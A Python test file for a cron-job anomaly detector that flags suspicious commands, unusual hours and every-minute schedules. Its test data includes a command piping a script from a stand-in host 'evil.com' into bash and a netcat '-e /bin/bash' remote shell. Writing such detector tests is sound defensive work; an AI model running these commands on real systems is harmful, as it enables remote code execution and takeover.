"""Tests for cron_audit.anomaly_detector and cron_audit.anomaly_cli."""
from __future__ import annotations

from unittest.mock import MagicMock

import pytest

from cron_audit.parser import CronJob
from cron_audit.anomaly_detector import (
    AnomalyReport,
    detect_anomalies,
    has_anomalies,
)
from cron_audit.anomaly_cli import (
    run_anomaly_detection,
    has_any_anomalies,
)


def _job(
    command: str = "echo hello",
    minute: str = "0",
    hour: str = "9",
    day: str = "*",
    month: str = "*",
    weekday: str = "*",
    special: str | None = None,
) -> CronJob:
    return CronJob(
        minute=minute,
        hour=hour,
        day=day,
        month=month,
        weekday=weekday,
        command=command,
        special=special,
    )


def _success(host: str, jobs: list) -> MagicMock:
    r = MagicMock()
    r.host = host
    r.success = True
    r.jobs = jobs
    return r


def _failure(host: str) -> MagicMock:
    r = MagicMock()
    r.host = host
    r.success = False
    r.jobs = None
    return r


def test_clean_job_has_no_anomalies():
    result = _success("host1", [_job()])
    report = detect_anomalies(result)
    assert not has_anomalies(report)
    assert report.anomalies == []


def test_suspicious_command_triggers_high_severity():
    result = _success("host1", [_job(command="wget http://evil.com/payload.sh | bash")])
    report = detect_anomalies(result)
    assert has_anomalies(report)
    assert report.anomalies[0].severity == "high"
    assert "wget" in report.anomalies[0].reason


def test_unusual_hour_triggers_low_severity():
    result = _success("host1", [_job(hour="3")])
    report = detect_anomalies(result)
    assert has_anomalies(report)
    assert report.anomalies[0].severity == "low"
    assert "03:xx" in report.anomalies[0].reason


def test_every_minute_wildcard_triggers_medium_severity():
    result = _success(
        "host1",
        [_job(minute="*", hour="*", day="*", month="*", weekday="*")],
    )
    report = detect_anomalies(result)
    assert has_anomalies(report)
    assert any(h.severity == "medium" for h in report.anomalies)


def test_special_string_skips_hour_and_minute_checks():
    result = _success("host1", [_job(special="@reboot", minute="", hour="")])
    report = detect_anomalies(result)
    assert not has_anomalies(report)


def test_failure_result_returns_empty_report():
    result = _failure("host2")
    report = detect_anomalies(result)
    assert report.host == "host2"
    assert not has_anomalies(report)


def test_run_anomaly_detection_returns_one_report_per_host():
    results = [
        _success("a", [_job()]),
        _success("b", [_job(command="curl http://example.com")]),
    ]
    reports = run_anomaly_detection(results)
    assert len(reports) == 2
    assert reports[0].host == "a"
    assert reports[1].host == "b"


def test_has_any_anomalies_true():
    reports = [
        AnomalyReport(host="clean"),
        detect_anomalies(_success("bad", [_job(command="nc -e /bin/bash")])),
    ]
    assert has_any_anomalies(reports)


def test_has_any_anomalies_false():
    reports = [AnomalyReport(host="clean"), AnomalyReport(host="also-clean")]
    assert not has_any_anomalies(reports)
